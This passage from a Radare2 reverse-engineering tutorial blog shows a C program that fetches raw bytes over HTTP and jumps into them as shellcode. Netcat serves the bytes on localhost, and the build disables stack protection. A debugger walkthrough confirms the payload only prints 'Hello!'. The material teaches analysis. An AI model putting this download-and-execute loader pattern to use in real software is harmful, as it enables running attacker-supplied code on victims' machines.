   <span class="n">bzero</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">serv_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">serv_addr</span><span class="p">));</span>
   <span class="n">serv_addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
   <span class="n">bcopy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">server</span><span class="o">-&gt;</span><span class="n">h_addr</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">serv_addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="p">,</span> <span class="n">server</span><span class="o">-&gt;</span><span class="n">h_length</span><span class="p">);</span>
   <span class="n">serv_addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">portno</span><span class="p">);</span>

   <span class="k">if</span> <span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">serv_addr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">serv_addr</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
   <span class="p">}</span>

   <span class="n">bzero</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="n">BSIZE</span><span class="p">);</span>

   <span class="n">n</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">request</span><span class="p">));</span>

   <span class="n">bzero</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="n">BSIZE</span><span class="p">);</span>
   <span class="n">n</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">BSIZE</span><span class="p">);</span>
   <span class="n">printf</span><span class="p">(</span><span class="s">"jumpting to shellcode</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
   <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)();</span>
   <span class="n">func</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="p">)())</span> <span class="n">buffer</span><span class="p">;</span>
   <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="o">*</span><span class="n">func</span><span class="p">)();</span>

   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>That’ll be it, our small int func buffer routine has been added at the end and this time we are not reading a string but some executable bytes.</p>

<p>This time as I don’t want to over-complicate the example I won’t use a web server like apache2, I’ll use the netcat software to “emulate” a web server for this single request as follows:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">:/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvp</span> <span class="mi">80</span> <span class="o">&lt;</span> <span class="n">sh</span> 
<span class="n">Listening</span> <span class="n">on</span> <span class="p">[</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">]</span> <span class="p">(</span><span class="n">family</span> <span class="mi">0</span><span class="p">,</span> <span class="n">port</span> <span class="mi">80</span><span class="p">)</span>
<span class="n">Connection</span> <span class="n">from</span> <span class="n">localhost</span> <span class="mi">36428</span> <span class="n">received</span><span class="o">!</span>
<span class="n">GET</span> <span class="o">/</span><span class="n">sh</span> <span class="n">HTTP</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span>
<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="o">:</span> <span class="n">nc</span><span class="o">/</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span>
<span class="n">Host</span><span class="o">:</span> <span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span>
<span class="n">Accept</span><span class="o">:</span> <span class="err">*/</span><span class="o">*</span>
</code></pre></div></div>
<p>being sh the RAW HEX shellcode. This command basically indicates netcat to just dump the (bytes) from that file to the first client connected to its port 80.</p>

<p>Then running the progam will go like:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">:~/</span><span class="n">C</span><span class="o">/</span><span class="n">generic</span><span class="err">$</span> <span class="n">gcc</span> <span class="o">-</span><span class="n">w</span> <span class="n">httpget_download_shellcode</span><span class="p">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">sh</span> <span class="o">-</span><span class="n">fno</span><span class="o">-</span><span class="n">stack</span><span class="o">-</span><span class="n">protector</span> <span class="o">-</span><span class="n">z</span> <span class="n">execstack</span>
<span class="o">:~/</span><span class="n">C</span><span class="o">/</span><span class="n">generic</span><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">sh</span> 
<span class="n">jumpting</span> <span class="n">to</span> <span class="n">shellcode</span>
<span class="n">Hello</span><span class="o">!</span>
</code></pre></div></div>
<p>Note that I compiled the program using those flags, otherwise it won’t work.</p>

<p>Let’s now analyze it:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>         <span class="mh">0x55d39c38bac4</span>      <span class="mi">89</span><span class="n">c7</span>           <span class="n">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span>           <span class="mh">0x55d39c38bac6</span>      <span class="n">b800000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">│</span>           <span class="p">;</span><span class="o">--</span> <span class="n">rip</span><span class="o">:</span>
<span class="err">│</span>           <span class="mh">0x55d39c38bacb</span> <span class="n">b</span>    <span class="n">e8c0fcffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">read</span>       <span class="p">;</span> <span class="kt">ssize_t</span> <span class="n">read</span><span class="p">(</span><span class="kt">int</span> <span class="n">fildes</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">nbyte</span><span class="p">)</span>
<span class="err">│</span>           <span class="mh">0x55d39c38bad0</span>      <span class="mi">8945</span><span class="n">ec</span>         <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_14h</span><span class="p">],</span> <span class="n">eax</span>
<span class="err">│</span>           <span class="mh">0x55d39c38bad3</span>      <span class="mi">488</span><span class="n">d3db40000</span><span class="p">.</span>  <span class="n">lea</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">str</span><span class="p">.</span><span class="n">jumpting_to_shellcode</span> <span class="p">;</span> <span class="mh">0x55d39c38bb8e</span> <span class="p">;</span> <span class="s">"jumpting to shellcode"</span>
<span class="err">│</span>           <span class="mh">0x55d39c38bada</span>      <span class="n">e871fcffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">puts</span>       <span class="p">;</span> <span class="kt">int</span> <span class="n">puts</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">)</span>
<span class="err">│</span>           <span class="mh">0x55d39c38badf</span>      <span class="mi">488</span><span class="n">d8570feff</span><span class="p">.</span>  <span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">var_190h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55d39c38bae6</span>      <span class="mf">488945e0</span>       <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_20h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55d39c38baea</span>      <span class="mi">488</span><span class="n">b55e0</span>       <span class="n">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_20h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55d39c38baee</span>      <span class="n">b800000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">│</span>           <span class="mh">0x55d39c38baf3</span>      <span class="n">ffd2</span>           <span class="n">call</span> <span class="n">rdx</span>
</code></pre></div></div>
<p>The buffer starts empty, as usual and then it will be filled with some good shellcode:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x55d39c38bacb</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">afvd</span>
<span class="n">type</span><span class="o">:</span><span class="kt">char</span> <span class="o">**</span> <span class="n">doesn</span><span class="err">'</span><span class="n">t</span> <span class="n">exist</span>
<span class="n">arg</span> <span class="n">argc</span> <span class="o">=</span> <span class="mh">0x00000003</span> <span class="mh">0xffffffffffffffff</span>   <span class="p">........</span> <span class="err">@</span><span class="n">rdi</span> <span class="mi">0</span>
<span class="n">arg</span> <span class="n">argv</span> <span class="o">=</span> 
<span class="n">var</span> <span class="n">var_194h</span> <span class="o">=</span> <span class="mh">0x7ffe727894ec</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x0000000000000001</span>
<span class="n">var</span> <span class="n">var_1a0h</span> <span class="o">=</span> <span class="mh">0x7ffe727894e0</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x00007ffe72789768</span>
<span class="n">var</span> <span class="n">var_90h</span> <span class="o">=</span> <span class="mh">0x7ffe727895f0</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x2068732f20544547</span>
<span class="n">var</span> <span class="n">var_88h</span> <span class="o">=</span> <span class="mh">0x7ffe727895f8</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x312e312f50545448</span>
<span class="n">var</span> <span class="n">var_80h</span> <span class="o">=</span> <span class="mh">0x7ffe72789600</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x412d726573550a0d</span>
<span class="n">var</span> <span class="n">var_78h</span> <span class="o">=</span> <span class="mh">0x7ffe72789608</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x636e203a746e6567</span>
<span class="n">var</span> <span class="n">var_70h</span> <span class="o">=</span> <span class="mh">0x7ffe72789610</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x0a0d312e302e302f</span>
<span class="n">var</span> <span class="n">var_68h</span> <span class="o">=</span> <span class="mh">0x7ffe72789618</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x3231203a74736f48</span>
<span class="n">var</span> <span class="n">var_60h</span> <span class="o">=</span> <span class="mh">0x7ffe72789620</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x0d312e302e302e37</span>
<span class="n">var</span> <span class="n">var_58h</span> <span class="o">=</span> <span class="mh">0x7ffe72789628</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x3a7470656363410a</span>
<span class="n">var</span> <span class="n">var_50h</span> <span class="o">=</span> <span class="mh">0x7ffe72789630</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x0a0d0a0d2a2f2a20</span>
<span class="n">var</span> <span class="n">var_48h</span> <span class="o">=</span> <span class="mh">0x7ffe72789638</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x0000000000f0b500</span>
<span class="n">var</span> <span class="n">var_4h</span> <span class="o">=</span> <span class="mh">0x7ffe7278967c</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x9c38bb0000000050</span>
<span class="n">var</span> <span class="n">var_8h</span> <span class="o">=</span> <span class="mh">0x7ffe72789678</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x0000005000000003</span>
<span class="n">var</span> <span class="n">var_10h</span> <span class="o">=</span> <span class="mh">0x7ffe72789670</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x00007f4571b62300</span>
<span class="n">var</span> <span class="n">var_30h</span> <span class="o">=</span> <span class="mh">0x7ffe72789650</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x0100007f50000002</span>
<span class="n">var</span> <span class="n">var_2eh</span> <span class="o">=</span> <span class="mh">0x7ffe72789652</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x00000100007f5000</span>
<span class="n">var</span> <span class="n">var_190h</span> <span class="o">=</span> <span class="mh">0x7ffe727894f0</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x0000000000000000</span>
<span class="n">var</span> <span class="n">var_14h</span> <span class="o">=</span> <span class="mh">0x7ffe7278966c</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x71b6230000000048</span>
<span class="n">var</span> <span class="n">var_20h</span> <span class="o">=</span> <span class="mh">0x7ffe72789660</span> <span class="o">=</span> <span class="p">(</span><span class="n">qword</span><span class="p">)</span><span class="mh">0x000055d39c38bb00</span>

<span class="p">[</span><span class="mh">0x55d39c38bacb</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pxw</span> <span class="err">@</span> <span class="mh">0x7ffe727894f0</span>
<span class="mh">0x7ffe727894f0</span>  <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>  <span class="p">................</span>
<span class="mh">0x7ffe72789500</span>  <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>  <span class="p">................</span>
<span class="mh">0x7ffe72789510</span>  <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>  <span class="p">................</span>
<span class="mh">0x7ffe72789520</span>  <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>  <span class="p">................</span>
<span class="mh">0x7ffe72789530</span>  <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>  <span class="p">................</span>
<span class="mh">0x7ffe72789540</span>  <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>  <span class="p">................</span>
<span class="mh">0x7ffe72789550</span>  <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>  <span class="p">................</span>
<span class="mh">0x7ffe72789560</span>  <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>  <span class="p">................</span>
</code></pre></div></div>
<p>Then after the read call:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x55d39c38bacb</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">dc</span>
<span class="n">hit</span> <span class="n">breakpoint</span> <span class="n">at</span><span class="o">:</span> <span class="mi">55</span><span class="n">d39c38bad0</span>
<span class="p">[</span><span class="mh">0x55d39c38bad0</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pxw</span> <span class="err">@</span> <span class="mh">0x7ffe727894f0</span>
<span class="mh">0x7ffe727894f0</span>  <span class="mh">0x8d4800eb</span> <span class="mh">0x00001d35</span> <span class="mh">0x0001bf00</span> <span class="mh">0x07ba0000</span>  <span class="p">..</span><span class="n">H</span><span class="p">.</span><span class="mi">5</span><span class="p">...........</span>
<span class="mh">0x7ffe72789500</span>  <span class="mh">0xb8000000</span> <span class="mh">0x00000001</span> <span class="mh">0xff31050f</span> <span class="mh">0x00003cb8</span>  <span class="p">..........</span><span class="mi">1</span><span class="p">..</span><span class="o">&lt;</span><span class="p">..</span>
<span class="mh">0x7ffe72789510</span>  <span class="mh">0x31050f00</span> <span class="mh">0x6548c3c0</span> <span class="mh">0x216f6c6c</span> <span class="mh">0x0000000a</span>  <span class="p">...</span><span class="mi">1</span><span class="p">..</span><span class="n">Hello</span><span class="o">!</span><span class="p">....</span>
<span class="mh">0x7ffe72789520</span>  <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>  <span class="p">................</span>
</code></pre></div></div>
<p>Here we have it here!</p>

<p>Now at this point:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">│</span>           <span class="mh">0x55d39c38baea</span>      <span class="mi">488</span><span class="n">b55e0</span>       <span class="n">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_20h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55d39c38baee</span>      <span class="n">b800000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">│</span>           <span class="p">;</span><span class="o">--</span> <span class="n">rip</span><span class="o">:</span>
<span class="err">│</span>           <span class="mh">0x55d39c38baf3</span> <span class="n">b</span>    <span class="n">ffd2</span>           <span class="n">call</span> <span class="n">rdx</span>
<span class="err">│</span>           <span class="mh">0x55d39c38baf5</span>      <span class="n">b800000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">│</span>           <span class="mh">0x55d39c38bafa</span>      <span class="n">c9</span>             <span class="n">leave</span>
<span class="err">└</span>           <span class="mh">0x55d39c38bafb</span>      <span class="n">c3</span>             <span class="n">ret</span>
<span class="p">[</span><span class="mh">0x55d39c38baf3</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">dr</span> <span class="n">rdx</span>
<span class="mh">0x7ffe727894f0</span>
<span class="p">[</span><span class="mh">0x55d39c38baf3</span><span class="p">]</span><span class="o">&gt;</span> 
</code></pre></div></div>
<p>And as we see if we use pd to dump those instructions there we see that they all make sense:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x559e09c42af3</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pd</span> <span class="mi">20</span> <span class="err">@</span> <span class="mh">0x7ffe05af6b40</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">rdx</span><span class="o">:</span>
        <span class="err">┌─</span><span class="o">&lt;</span> <span class="mh">0x7ffe05af6b40</span>      <span class="n">eb00</span>           <span class="n">jmp</span> <span class="mh">0x7ffe05af6b42</span>
        <span class="err">└─</span><span class="o">&gt;</span> <span class="mh">0x7ffe05af6b42</span>      <span class="mi">488</span><span class="n">d351d0000</span><span class="p">.</span>  <span class="n">lea</span> <span class="n">rsi</span><span class="p">,</span> <span class="p">[</span><span class="mh">0x7ffe05af6b66</span><span class="p">]</span> <span class="p">;</span> <span class="s">"Hello!</span><span class="se">\n</span><span class="s">"</span>
            <span class="mh">0x7ffe05af6b49</span>      <span class="n">bf01000000</span>     <span class="n">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="mi">1</span>
            <span class="mh">0x7ffe05af6b4e</span>      <span class="n">ba07000000</span>     <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mi">7</span>
            <span class="mh">0x7ffe05af6b53</span>      <span class="n">b801000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">1</span>
            <span class="mh">0x7ffe05af6b58</span>      <span class="mi">0</span><span class="n">f05</span>           <span class="n">syscall</span>
            <span class="mh">0x7ffe05af6b5a</span>      <span class="mi">31</span><span class="n">ff</span>           <span class="n">xor</span> <span class="n">edi</span><span class="p">,</span> <span class="n">edi</span>
            <span class="mh">0x7ffe05af6b5c</span>      <span class="n">b83c000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mh">0x3c</span>           <span class="p">;</span> <span class="sc">'&lt;'</span> <span class="p">;</span> <span class="mi">60</span>
            <span class="mh">0x7ffe05af6b61</span>      <span class="mi">0</span><span class="n">f05</span>           <span class="n">syscall</span>
            <span class="mh">0x7ffe05af6b63</span>      <span class="mi">31</span><span class="n">c0</span>           <span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
            <span class="mh">0x7ffe05af6b65</span>      <span class="n">c3</span>             <span class="n">ret</span>
            <span class="mh">0x7ffe05af6b66</span>      <span class="mi">48656</span><span class="n">c</span>         <span class="n">insb</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rdi</span><span class="p">],</span> <span class="n">dx</span>
            <span class="mh">0x7ffe05af6b69</span>      <span class="mi">6</span><span class="n">c</span>             <span class="n">insb</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rdi</span><span class="p">],</span> <span class="n">dx</span>
            <span class="mh">0x7ffe05af6b6a</span>      <span class="mi">6</span><span class="n">f</span>             <span class="n">outsd</span> <span class="n">dx</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rsi</span><span class="p">]</span>
            <span class="mh">0x7ffe05af6b6b</span>      <span class="mi">210</span><span class="n">a</span>           <span class="n">and</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rdx</span><span class="p">],</span> <span class="n">ecx</span>
</code></pre></div></div>
<p>And that will be enough for today.</p>

<p>On the next posts we’ll go over some more advanced topics such as command and control mechanisms over DNS this time exploring the Windows API instead.</p>


            </div>
            <footer class="post-footer">
                
                <p class="post-tags">
                     
                    <a href='https://artik.blue/tag/reversing/'>reversing</a>
                    
                     
                    <a href='https://artik.blue/tag/c/'>c</a>
                    
                     
                    <a href='https://artik.blue/tag/radare/'>radare</a>
                    
                    
                </p>
                
                <div class="post-share">
                    <span class="post-share-title">Share:</span>
                    <a target="_blank" href="https://twitter.com/share?text=Reverse+engineering+x64+binaries+with+Radare2+-+16+-+II+%28more+sockets%2C+http+emulation%2C+radasm%2C+ragg+and+shellcode%29&amp;url=https://artik.blue/reversing-radare-16">Twitter</a>
                    <a target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://artik.blue/reversing-radare-16">Facebook</a>
                </div><!-- .share-post -->
            </footer>
            <div class="author-box">
                <div class="author-avatar"><img src="assets/images/avatar.png" alt="Artikblue's Picture"
                        class="avatar"></div>
                <div class="author-details">
                    <h2 class="author-title">About Artikblue</h2>
                    <p class="author-description"></p>
                </div>
            </div>
            
<section id="comments-area" class="comments-area">
    <h2 class="comments-title">Comments</h2>
    <div class="comments-inside">
        <div id="disqus_thread"></div>
    </div><!-- .comments-inside -->
    <div id="comments-overlay" class="comments-overlay">
        <a href="reversing-radare-16.html#" id="comments-show" class="comments-show">Show comments</a>
    </div><!-- .comments-overlay -->
    <script type="text/javascript">
        var disqus_shortname = 'artikblue';
        var disqus_developer = 0;
        (function () {
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by
            Disqus.</a></noscript>
    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</section>


        </article>
        
        <section class="read-next inner">
            <h2 class="read-next-title">Read Next</h2>
            
            <article class="post">
                <header class="post-header">
                    <div class="post-meta">
                        <time class="published" datetime="June 3, 2020">June 3, 2020</time>
                    </div>
                    <h3 class="post-title"><a href="opsec-2.html">Operational security techniques in asymmetric conflicts - II (device acquisitions)</a></h3>
                    <p class="post-tags">
                        
                        
                        
                        <a href='https://artik.blue/tag/opsec/'>Opsec</a>
                        
                        
                        
                    </p>
                </header>
                
                <a href="opsec-2.html" class="post-thumbnail">
                    <img src="assets/images/opsec/opsec2.png" alt="Operational security techniques in asymmetric conflicts - II (device acquisitions)" />
                </a>
                
            </article>
            
            
            <article class="post">
                <header class="post-header">
                    <div class="post-meta">
                        <time class="published" datetime="December 1, 2020">December 1, 2020</time>
                    </div>
                    <h3 class="post-title"><a href="shodan-intelligence-1.html">Generating contextual geographic intelligence with shodan</a></h3>
                    <p class="post-tags">
                        
                        
                        
                        <a href='https://artik.blue/tag/shodan/'>Shodan</a>
                        
                        
                        
                        <a href='https://artik.blue/tag/python/'>Python</a>
                        
                        
                        
                        <a href='https://artik.blue/tag/analysis/'>Analysis</a>
                        
                        
                        
                    </p>
                </header>
                
                <a href="shodan-intelligence-1.html" class="post-thumbnail">
                    <img src="assets/images/shodan.png" alt="Generating contextual geographic intelligence with shodan" />
                </a>
                
            </article>
            
        </section><!-- .read-next -->
    </main><!-- .site-main -->
</div><!-- .site-content -->

        

        

        <footer id="colophon" class="site-footer outer">
            <div class="site-footer-inside">
                <p class="social-links">
    
    <a href="https://twitter.com/artikblue" target="_blank">
        <span class="fa-twitter fa" aria-hidden="true"></span>
        <span class="screen-reader-text">Twitter</span>
    </a>
    
    
    
    <a href="https://github.com/artikblue" target="_blank">
        <span class="fa-github fa" aria-hidden="true"></span>
        <span class="screen-reader-text">GitHub</span>
    </a>
    
    
    
    
    <a href="https://medium.com/@artikblue" target="_blank">
        <span class="fa-medium fa" aria-hidden="true"></span>
        <span class="screen-reader-text">medium</span>
    </a>
    
    
    
    
    
</p>
                <p class="site-info">
                    <a href="reversing-radare-16.html#">Artik blue</a> &copy; 2020 . Horace theme by
                    <a target="_blank" href="https://justgoodthemes.com/">JustGoodThemes</a>. <br />
                    Powered by <a target="_blank" href="https://jekyllrb.com/">Jekyll</a>.
                </p>
                <p class="back-to-top">
                    <a id="top-button" class="top-button" href="reversing-radare-16.html#page">
                        <span class="icon-arrow-up" aria-hidden="true"></span>
                        <span class="screen-reader-text">Back to top</span>
                    </a>
                </p>
            </div><!-- .site-footer-inside -->
        </footer><!-- .site-footer -->
    </div><!-- .site -->
    <div id="site-overlay" class="site-overlay"></div>
    <aside id="sidebar" class="sidebar">
	<div class="sidebar-scrollable">
		<div class="sidebar-inside">
			<button id="sidebar-hide" class="sidebar-toggle"><span class="screen-reader-text">Close Sidebar</span><span
				    aria-hidden="true" class="icon-close"></span></button>
			<nav id="sidebar-navigation" class="widget site-navigation">
				<h2 class="widget-title">Explore Site</h2>
				<ul class="menu">
					
						<li class="menu-item"><a href="about.html">About</a></li>
					
						<li class="menu-item"><a href="reversing.html">Reversing</a></li>
					
				</ul>
			</nav>
			
<section class="widget widget-text">
    <h2 class="widget-title">About Artik blue</h2>
    <p>Alternate use of modern technology also known as hacking.</p>
</section>


<section class="widget widget-recent-posts">
    <h2 class="widget-title">Recent Articles</h2>
    <ul>
        
        <li>
            <div class="post-header">
                <div class="post-meta">
                    <time class="published" datetime="??">December 1, 2020</time>
                </div>
                <div class="post-title">
                    <a href="shodan-intelligence-1.html">Generating contextual geographic intelligence with shodan</a>
                </div>
            </div>
            
            <a class="post-thumbnail" href="shodan-intelligence-1.html">
                <img src="assets/images/shodan.png"
                    alt="Generating contextual geographic intelligence with shodan">
            </a>
            
        </li>
        
        <li>
            <div class="post-header">
                <div class="post-meta">
                    <time class="published" datetime="??">June 4, 2020</time>
                </div>
                <div class="post-title">
                    <a href="reversing-radare-16.html">Reverse engineering x64 binaries with Radare2 - 16 - II (more sockets, http emulation, radasm, ragg and shellcode)</a>
                </div>
            </div>
            
            <a class="post-thumbnail" href="reversing-radare-16.html">
                <img src="assets/images/radare2/radare2_17.png"
                    alt="Reverse engineering x64 binaries with Radare2 - 16 - II (more sockets, http emulation, radasm, ragg and shellcode)">
            </a>
            
        </li>
        
        <li>
            <div class="post-header">
                <div class="post-meta">
                    <time class="published" datetime="??">June 3, 2020</time>
                </div>
                <div class="post-title">
                    <a href="opsec-2.html">Operational security techniques in asymmetric conflicts - II (device acquisitions)</a>
                </div>
            </div>
            
            <a class="post-thumbnail" href="opsec-2.html">
                <img src="assets/images/opsec/opsec2.png"
                    alt="Operational security techniques in asymmetric conflicts - II (device acquisitions)">
            </a>
            
        </li>
        
    </ul>
</section>

<!-- Create a sorted array of tags -->
 
<section class="widget widget-tagcloud">
    <h2 class="widget-title">Tags</h2>
    <div class="tagcloud">
        
        <a href='https://artik.blue/tag/analysis/'>analysis</a>
        
        <a href='https://artik.blue/tag/anonymous/'>anonymous</a>
        
        <a href='https://artik.blue/tag/apis/'>apis</a>
        
        <a href='https://artik.blue/tag/arduino/'>arduino</a>
        
        <a href='https://artik.blue/tag/asm/'>asm</a>
        
        <a href='https://artik.blue/tag/asyncio/'>asyncio</a>
        
        <a href='https://artik.blue/tag/atmel/'>atmel</a>
        
        <a href='https://artik.blue/tag/c/'>c</a>
        
        <a href='https://artik.blue/tag/communities/'>communities</a>
        
        <a href='https://artik.blue/tag/hacktivism/'>hacktivism</a>
        
